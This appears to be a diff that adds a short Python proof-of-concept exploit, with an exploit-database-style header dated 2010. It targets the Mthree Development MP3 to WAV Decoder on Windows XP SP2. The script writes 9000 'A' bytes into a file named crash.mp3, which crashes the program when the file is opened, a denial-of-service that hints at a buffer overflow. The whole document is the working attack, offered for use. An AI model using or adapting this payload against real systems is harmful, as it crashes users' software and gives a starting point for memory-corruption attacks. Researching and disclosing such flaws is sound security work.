@@ -1,0 +1,20 @@
+# Exploit Title: Mthree Development MP3 to WAV Decoder (.mp3) DoS
+# Date: 10 / 8 / 2010
+# Author: Oh Yaw Theng
+# Credit : ZAC003(4m!n) 
+# Software Link: http://www.mthreedev.com/setupmp3towav.exe
+# Tested on: Windows XP SP 2
+# CVE : N / A
+# Description : Create the malicious .mp3 file , open up using Mthree , after that double click on the file .. Boom ! DEADBEEF !
+
+#!/usr/bin/python
+
+filename = "crash.mp3"
+
+junk = "\x41" * 9000
+
+exploit = junk
+
+textfile = open(filename,'w')
+textfile.write(exploit)
+textfile.close()
